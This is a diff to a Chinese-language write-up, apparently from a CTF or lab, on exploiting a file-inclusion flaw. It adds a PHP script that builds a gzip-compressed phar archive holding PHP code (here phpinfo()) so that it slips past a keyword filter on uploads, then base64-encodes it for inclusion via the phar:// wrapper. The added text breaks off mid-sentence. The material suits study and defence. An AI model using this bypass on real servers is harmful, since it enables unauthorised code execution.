@@ -317,4 +317,28 @@ else{
 1. 上传一个phar文件，里面写入test.txt，有php代码，
 2. 利用phar伪协议包含文件
 ## 尝试文件包含
+利用脚本生成phar.gz文件（因为会检查phar文件的关键字，所以打一个压缩包绕过）
+```php
+<?php
 
+$phar_file = "diag.phar";
+@unlink($phar_file);
+@unlink($phar_file . ".gz");
+
+$phar = new Phar($phar_file);
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+
+$code =
+'<?php
+phpinfo();
+?>';
+
+$phar->addFromString("test.txt", $code);
+$phar->stopBuffering();
+$phar->compress(Phar::GZ);
+
+echo base64_encode(file_get_contents($phar_file . ".gz"));
+?>
+```
+base64编码是为了方便我们d'x
